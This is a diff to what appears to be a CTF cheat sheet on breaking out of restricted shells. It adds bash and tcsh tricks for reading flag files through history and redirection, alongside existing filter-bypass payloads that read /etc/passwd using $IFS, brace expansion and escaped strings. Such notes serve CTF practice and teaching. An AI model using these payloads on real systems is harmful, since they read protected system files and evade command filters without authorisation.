@@ -257,6 +257,12 @@ unalias ssh
 eval 'ssh() { :; }'
 
 # jail
+# - Read using history
+export HISTFILE="/home/ctf/flag"; history -r; history
+#     - || tcsh
+set histfile = flag; history -L; history
+#     - || tcsh
+source -h flag; history
 # - Enumeration: use comment
 #     - id # ;
 #     - https://github.com/FrenchRoomba/ctf-writeup-HITCON-CTF-2020/blob/master/baby-shock/README.md
@@ -268,11 +274,15 @@ eval 'ssh() { :; }'
 # - https://hack.more.systems/writeup/2017/12/30/34c3ctf-minbashmaxfun/
 # - https://github.com/w181496/Web-CTF-Cheatsheet#%E7%A9%BA%E7%99%BD%E7%B9%9E%E9%81%8E
 # - https://github.com/trichimtrich/bashfuck
+
+# - Redirection
 cat$IFS$*flag
 cat</etc/passwd
 {cat,/etc/passwd}
 X=$'cat\x20/etc/passwd'&&$X
 IFS=,;`cat<<<uname,-a`
+#     - || tcsh
+( echo $< ) < /etc/ctf/flag.txt
 # - Source 3-letter file
 . f*o
 . ???
